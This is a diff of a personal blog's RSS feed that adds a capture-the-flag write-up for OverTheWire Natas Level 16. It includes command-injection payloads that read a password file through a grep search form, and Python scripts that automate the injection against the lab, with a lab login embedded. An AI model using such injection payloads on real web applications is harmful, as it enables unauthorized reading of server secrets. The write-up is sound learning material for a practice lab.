@@ -117,7 +117,7 @@ The dot tells grep to print indiscriminately. The (&amp;lt;) tells grep to get t
 &lt;p&gt;&lt;img src=&#34;https://koolaidxk1d.github.io/images/natas10-0.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
 &lt;p&gt;Let&amp;rsquo;s check and see which characters are not allowed.&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://koolaidxk1d.github.io/images/natas10-1.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
-&lt;p&gt;&amp;ldquo;preg_match()&amp;rdquo; is a function which uses regex. As you can see it is checking for &amp;ldquo;/[;|&amp;amp;]/&amp;rdquo;. In regex terms, it is actually just looking for either a &amp;ldquo;;&amp;rdquo; or a &amp;ldquo;&amp;amp;&amp;rdquo;. I did not use either of those in my solution so I can just reuse the previous solution (changing the filename obviously).&lt;/p&gt;
+&lt;p&gt;&amp;ldquo;preg_match()&amp;rdquo; is a function which uses regex. As you can see it is checking for &amp;ldquo;/[;|&amp;amp;]/&amp;rdquo;. In regex terms, it is actually just looking for &amp;ldquo;;&amp;rdquo;, &amp;ldquo;|&amp;rdquo;,  or &amp;ldquo;&amp;amp;&amp;rdquo;. I did not use any of those in my solution so I can just reuse the previous solution (changing the filename obviously).&lt;/p&gt;
 &lt;hr&gt;
 &lt;h2 id=&#34;level-11&#34;&gt;Level 11&lt;/h2&gt;
 &lt;p&gt;This is where this warbox starts to get challenging for me. The goal of this level seems to be to change the data cookie to the proper value so that the password will be revealed. The problem is that the cookie is XOR encrypted.&lt;/p&gt;
@@ -229,6 +229,86 @@ for i in range(1, 33):
 &lt;p&gt;&lt;img src=&#34;https://koolaidxk1d.github.io/images/natas15-1.gif&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
 &lt;hr&gt;
 &lt;h2 id=&#34;level-16&#34;&gt;Level 16&lt;/h2&gt;
+&lt;p&gt;Natas16 is revisiting the search form that executes grep which we found in 9 and 10. This time even more characters are filtered. To be precise, we can no longer use the following characters:&lt;/p&gt;
+&lt;p&gt;; | &amp;amp; ` &#39; &amp;quot;&lt;/p&gt;
+&lt;p&gt;and our input is placed in this PHP statement:&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;passthru(&amp;quot;grep -i \&amp;quot;{input here}\&amp;quot; dictionary.txt);&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;This makes things quite a bit more challenging. After &lt;em&gt;extensive&lt;/em&gt; efforts, I can not find a way to escape the double quotes and override the execution of grep. This means we will have to find some way to do everything within the context of grepping the dictionary file.&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;Great.&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;Luckily the dollar-sign and parentheses are not filtered, so we can use command substitution. Command substitution allows you to execute command x within command y to use x&amp;rsquo;s output as an argument (or even just part of an argument) to command y. For example:&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;echo $(echo hello)&lt;/code&gt; effectively runs as &lt;code&gt;echo hello&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Since the output of this page is just pattern matches of the dictionary file, we have to find a way to manipulate that mechanism to reflect information about the password.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://koolaidxk1d.github.io/images/natas16-0.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;First I will try to determine the individual letters of the password. The dictionary does not have digits in it, so that part will have to wait. Also, the grep flag -i is in use, which tells grep to ignore case. That means we will also have to find a way to determine which letters are uppercase.&lt;/p&gt;
+&lt;p&gt;A standard Linux utility called &amp;ldquo;cut&amp;rdquo; will help us with figuring out the letters. using command substitution, we can run &lt;code&gt;$(cut -c (number) /etc/natas_webpass/natas17)&lt;/code&gt; inside the double quotes of the command to only show words of the dictionary that contain the letter specified. For example, in the following picture, we can see that the first letter of the password must be &amp;lsquo;x&amp;rsquo;.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://koolaidxk1d.github.io/images/natas16-1.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Repeating this for all 32 characters gives us:&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;xkeuche-sbnkbvh-ru-ksib-uulmi-sd&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;The hyphens are just arbitrary marks I placed when the output was blank. In other words, they must be numbers. Speaking of numbers, we now have to determine the numerical characters of the password&amp;hellip;&lt;/p&gt;
+&lt;p&gt;One way we can use numbers in our grep search is with regex (Regular expressions). Instead of searching for particular spelling-based matches, we can search for lines of particular lengths. So If we use a regex formula that will find lines of length &amp;lsquo;a&amp;rsquo;, and we replace &amp;lsquo;a&amp;rsquo; with the specific char of the password (once again, using the &amp;lsquo;cut&amp;rsquo; command), then we should be able to tell what the number is based on the lengths of the lines in the output.&lt;/p&gt;
+&lt;p&gt;Therefore, we shall use the following command:&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;^.\{$(cut -c (number) /etc/natas_webpass/natas17)\}\$&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;This is not a regex write-up, so I will not get too off-topic. Basically, the string above will look for lines of a particular length, and that length is filled in using a command substitution that returns the character at the desired index of the given file.&lt;/p&gt;
+&lt;p&gt;The result looks like this:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://koolaidxk1d.github.io/images/natas16-2.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;After running this on all of our missing numbers, we now have even more information about the password.&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;xkeuche0sbnkbvh1ru7ksib9uulmi7sd&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;All we have to do now is determine the case of each character. This is especially tough because of the -i flag I mentioned earlier. We cannot return uppercase dictionary entries to show whether the chars are uppercase, because our searches will always ignore case.&lt;/p&gt;
+&lt;p&gt;The way I have found to approach this is using our own grep search (for each alphabetical character) which does two case-sensitive searches against the char itself&amp;ndash;once for lowercase and once for uppercase. The result of the search will be blank if there is no match, and if there is a match then the result will be the char we searched. When applied to the dictionary search form, this means that if it is the correct case guess, the dictionary will only show words of that letter. If The guess is incorrect, then the dictionary will receive a blank search pattern (which will match all words in the dictionary). So we can clearly see through the response whether a char is uppercase.&lt;/p&gt;
+&lt;p&gt;If this is confusing, I&amp;rsquo;ve made a terrible mspaint drawing to try to explain better. Observe.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://koolaidxk1d.github.io/images/natas16-3.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;The only problem with this is that grep can only work on files. I also tried using &amp;laquo;&amp;lt; to have the char act as an input to grep, but for some strange reason I cannot get that to work. Whatever shell is used on the server seems to ignore it, despite the less-than sign not being explicitly filtered in the source code. No problem, we can just make a script to create a bunch of files on the server containing the chars. We have write access to the /tmp/ directory, so I&amp;rsquo;ve used the following script:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;import requests
+
+url = &amp;quot;http://natas16.natas.labs.overthewire.org&amp;quot;
+credentials = (&amp;quot;natas16&amp;quot;, &amp;quot;TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V&amp;quot;)
+form_data = {&amp;quot;needle&amp;quot;: &amp;quot;x&amp;quot;}
+
+for i in range(1,33):
+    form_data[&amp;quot;needle&amp;quot;] = f&amp;quot;$(echo $(cut -c {i} /etc/natas_webpass/natas17) &amp;gt; /tmp/char{i})&amp;quot;
+
+        # Make the cURL request
+
+    response = requests.post(url, auth=credentials, data=form_data)
+
+    print(&amp;quot;Status code:&amp;quot;, response.status_code)
+    print(&amp;quot;Content:&amp;quot;, response.text)
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The end result is a bunch of files named &amp;ldquo;char&amp;rsquo;x&#39;&amp;rdquo; where x is the index of the string. Each file contains the char found at the corresponding index. Now we can use those files as input to grep.&lt;/p&gt;
+&lt;p&gt;Again, it&amp;rsquo;s much faster to use a script than to manually run our grep command twice for each alpha char (50-60 times!). I&amp;rsquo;ve written this script which will run our new grep command in the form and pause on each guess to allow me to see the output and judge whether there was a match and write down the correct case of the char.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;import requests
+
+url = &amp;quot;http://natas16.natas.labs.overthewire.org&amp;quot;
+credentials = (&amp;quot;natas16&amp;quot;, &amp;quot;TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V&amp;quot;)
+form_data = {&amp;quot;needle&amp;quot;: &amp;quot;x&amp;quot;}
+
+password = &amp;quot;xkeuche0sbnkbvh1ru7ksib9uulmi7sd&amp;quot;
+
+for i in range(1,33):
+    form_data[&amp;quot;needle&amp;quot;] = f&amp;quot;$(grep -o {password[i-1]} /tmp/char{i})&amp;quot;
+
+    response = requests.post(url, auth=credentials, data=form_data)
+
+    print(&amp;quot;Status code:&amp;quot;, response.status_code)
+    print(&amp;quot;Content:&amp;quot;, response.text)
+    print(f&amp;quot;current guess: {password[i-1]}&amp;quot;)
+    wait = input()
+
+    form_data[&amp;quot;needle&amp;quot;] = f&amp;quot;$(grep -o {password[i-1].upper()} /tmp/char{i})&amp;quot;
+
+    response = requests.post(url, auth=credentials, data=form_data)
+
+    print(&amp;quot;Status code:&amp;quot;, response.status_code)
+    print(&amp;quot;Content:&amp;quot;, response.text)
+    print(f&amp;quot;current guess: {password[i-1].upper()}&amp;quot;)
+    wait = input()
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;I will not spoil the final password, but the script did allow me to get the correct case of each char and move on to the next level.&lt;/p&gt;
+&lt;p&gt;This was the hardest level yet for sure. I kept coming back to it over the course of a couple weeks before I finally figured it out. It&amp;rsquo;s hard to say whether this was even close to the intended solution. I still wonder whether there was a way of escaping the quotes that I overlooked.&lt;/p&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;level-17&#34;&gt;Level 17&lt;/h2&gt;
 &lt;p&gt;(coming soon)&lt;/p&gt;
 - https://koolaidxk1d.github.io/posts/natas/ - </description>
         </item>
@@ -254,6 +334,10 @@ for i in range(1, 33):
 &lt;p&gt;&lt;a href=&#34;https://justbeamit.com/&#34;&gt;https://justbeamit.com/&lt;/a&gt; - P2P direct file transfer, drag n drop, no sign up&lt;/p&gt;
 &lt;p&gt;&lt;a href=&#34;https://www.tumbig.com/&#34;&gt;https://www.tumbig.com/&lt;/a&gt; - gifs and stuff&lt;/p&gt;
 &lt;p&gt;&lt;a href=&#34;https://quickref.me/&#34;&gt;https://quickref.me/&lt;/a&gt; - cheat sheets for everything imaginable&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://devmanual.gentoo.org/tools-reference/bash/index.html&#34;&gt;https://devmanual.gentoo.org/tools-reference/bash/index.html&lt;/a&gt; - bash reference guide&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://doesitarm.com/&#34;&gt;https://doesitarm.com/&lt;/a&gt; - check applications for native ARM support&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://armconverter.com/decryptedappstore&#34;&gt;https://armconverter.com/decryptedappstore&lt;/a&gt; - get basically any iOS IPA&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://img.doerig.dev/&#34;&gt;https://img.doerig.dev/&lt;/a&gt; - instant imgur upload&lt;/p&gt;
 - https://koolaidxk1d.github.io/posts/links/ - </description>
         </item>
     
